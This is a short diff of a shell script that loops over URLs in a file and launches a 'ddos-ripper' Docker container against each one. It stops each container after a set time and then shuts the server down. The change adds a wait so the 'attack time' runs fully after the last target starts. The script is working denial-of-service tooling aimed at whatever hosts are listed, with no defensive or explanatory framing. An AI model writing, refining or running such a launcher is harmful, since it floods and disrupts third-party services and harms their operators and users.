@@ -12,5 +12,5 @@ while read link; do
     sudo docker stop -t $1 $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest "$link") &
     sleep 5
 done </tmp/links.txt
-
+sleep $1 # waiting attack time after last links started, before server shutdown
 sudo shutdown now
